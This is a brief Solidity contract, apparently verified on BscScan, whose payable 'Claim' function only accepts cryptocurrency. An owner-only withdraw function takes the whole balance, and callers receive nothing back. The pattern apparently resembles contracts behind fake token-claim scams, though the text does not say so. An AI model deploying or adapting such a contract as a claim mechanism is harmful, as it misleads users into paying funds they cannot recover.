/**
 *Submitted for verification at BscScan.com on 2023-02-28
*/

pragma solidity ^0.8.17;
 
contract Claimer {
 
    address private owner;
 
     constructor() public{   
        owner=msg.sender;
    }
 
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
 
 
    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }
 
    function Claim() public payable {
    }
 
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}